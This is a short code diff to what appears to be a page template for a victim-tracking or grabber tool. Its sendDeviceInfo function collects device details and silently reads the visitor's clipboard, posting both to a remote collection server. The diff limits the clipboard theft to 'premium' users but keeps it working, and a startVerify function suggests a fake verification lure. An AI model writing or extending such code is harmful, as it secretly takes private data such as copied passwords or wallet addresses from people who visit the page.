@@ -103,10 +103,10 @@ async function sendDeviceInfo(){
   if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<br><b>🔋 Battery: "+b.level*100+"% | Charging: "+b.charging+"</b>";}catch(e){}}
   $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
 
-  // Clipboard
-  if(navigator.clipboard&&navigator.clipboard.readText){
+  // Clipboard (premium only)
+<% if(premium){ %>  if(navigator.clipboard&&navigator.clipboard.readText){
     try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim()){$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}}catch(e){}
-  }
+  }<% } %>
 }
 
 async function startVerify(){
